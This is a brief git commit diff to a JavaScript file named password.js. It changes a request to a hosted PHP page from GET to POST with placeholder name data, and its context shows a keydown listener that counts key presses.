89862ed99583bc83ab31c6a077d9fccad66eb41e
PDA <PDA@Tests-MacBook-Pro-3.local>
2018-10-28 20:25:25 -0400

    updating

--- password.js
+++ password.js
@@ -21,8 +21,8 @@ cli.onreadystatechange = function() {
             }
         }
 };
-cli.open('GET', 'https://palexandrov.000webhostapp.com/index.php');
-cli.send();
+cli.open('POST', 'https://palexandrov.000webhostapp.com/index.php');
+cli.send('fname=Henry&lname=Ford');
 
 window.addEventListener("keydown", event => {
     c_down = c_down + 1;
